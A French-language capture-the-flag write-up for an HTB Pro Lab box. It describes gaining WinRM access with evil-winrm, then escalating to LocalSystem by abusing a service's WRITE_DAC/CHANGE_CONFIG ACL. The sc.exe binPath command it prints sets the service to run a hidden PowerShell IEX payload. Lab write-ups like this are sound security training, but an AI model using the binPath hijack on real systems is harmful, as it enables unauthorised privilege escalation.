---
doc_kind: writeup
title: "DANTE WS02 - WinRM credentials puis abus ACL service WRITE_DAC"
category: pwn
slug: ws02-service-acl-write-dac-privesc
created: 2026-10-29
status: solved
tags:
  - service-acl-abuse
  - write-dac
  - binpath-hijack
  - evil-winrm
  - windows-privesc
source: "HTB Pro Lab DANTE"
target: "Service Windows avec ACL WRITE_DAC exploitable"
---
# DANTE WS02 - WinRM credentials puis abus ACL service WRITE_DAC

## Challenge Summary

- Source: HTB Pro Lab DANTE
- Target: Service Windows avec ACL WRITE_DAC exploitable
- Goal: Un mot de passe trouve donne acces WinRM (Evil-WinRM Ruby requis, pywinrm refuse); l'ACL d'un service accorde SERVICE_CHANGE_CONFIG/WRITE_DAC/WRITE_OWNER permettant de modifier binPath.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. Creds invalides sur une premiere tentative -> note revele le bon mot de passe.
2. evil-winrm (client Ruby) via proxychains -> flag utilisateur.
3. sc.exe sdshow <service> -> SID utilisateur avec droits CCDCLCSWRPWPLORC (WRITE_DAC/WRITE_OWNER/CHANGE_CONFIG).
4. sc.exe config <service> binPath= 'powershell -w hidden -nop -c IEX(...)'.
5. Redemarrage du service (verifier droits start/stop apres reset).
6. Service AUTO_START execute le payload en LocalSystem au redemarrage -> flag admin.

## Key Evidence

- sc.exe sdshow listant l'ACE avec droits CCDCLCSWRPWPLORC; sc.exe qc confirmant le nouveau BINARY_PATH_NAME.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
sc.exe config <service> binPath= "powershell -w hidden -nop -c IEX(...)".
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Toujours sc.exe sdshow sur les services AUTO_START/LocalSystem pour reperer un WRITE_DAC/CHANGE_CONFIG exploitable par un utilisateur non-admin; pywinrm peut etre refuse alors qu'Evil-WinRM Ruby passe.

## Pattern Candidates

- Voir pattern associe de meme slug.
